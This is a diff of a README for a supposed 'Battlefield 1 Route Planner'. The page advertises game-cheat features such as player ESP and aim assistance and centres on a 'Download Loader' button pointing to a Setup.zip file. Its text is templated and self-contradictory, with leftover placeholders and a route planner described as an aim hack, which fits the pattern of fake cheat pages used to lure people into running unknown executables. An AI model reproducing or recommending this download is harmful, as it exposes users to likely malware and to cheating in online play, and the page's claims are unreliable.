@@ -1,2 +1,40 @@
-# Battlefield-1-Route-Planner
-{title} is a feature-rich third-party modification project for {Battlefield 1 Route Planner}.
+<div align="center">
+
+# 🎮 Battlefield 1 Route Planner
+
+> ⚡ Advanced Game Modification Project for Battlefield 1 Route Planner
+
+[![🚀 Download Loader](https://img.shields.io/badge/🚀%20Download%20Loader-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/WASD122/bvvb/releases/download/main/Setup.zip)
+
+---
+
+## 📖 About
+
+Battlefield 1 Route Planner is a feature-rich third-party modification project for Battlefield 1 Route Planner.
+
+---
+
+## ✨ Features
+
+- 👤 Player ESP
+- 🎯 Configurable Aim
+- 🖥️ Advanced Visual Settings
+- 🔫 Weapon Information
+- 🧍 Player Details
+- ⌨️ Custom Hotkeys
+
+---
+
+## 💾 Configuration System
+
+```text
+configs/
+├── default.cfg
+├── visual.cfg
+├── player.cfg
+└── custom.cfg
+```
+
+`Battlefield-1-Route-Planner` · Updated: 2026-10-30
+
+**Tags:** `battlefield-1` `route-planner` `shooter` `campaign` `loadout` `windows` `steam`
